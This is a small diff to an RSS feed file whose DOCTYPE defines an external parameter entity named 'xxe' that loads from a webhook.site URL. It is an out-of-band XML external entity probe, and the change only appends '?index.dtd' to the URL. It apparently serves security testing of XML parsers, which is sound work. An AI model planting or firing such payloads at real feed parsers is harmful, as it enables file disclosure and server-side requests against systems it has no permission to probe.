@@ -1,6 +1,6 @@
 <?xml version="1.0" encoding="UTF-8" ?>
 <!DOCTYPE rss [
-<!ENTITY % xxe SYSTEM "https://webhook.site/c41c7b43-f14a-46cd-afd9-2d3068866bc9">
+<!ENTITY % xxe SYSTEM "https://webhook.site/c41c7b43-f14a-46cd-afd9-2d3068866bc9?index.dtd">
 %xxe;
 ]>
 <rss version="2.0">
@@ -25,6 +25,7 @@
     </item>
   </channel>
 </rss>
+
 
 
 
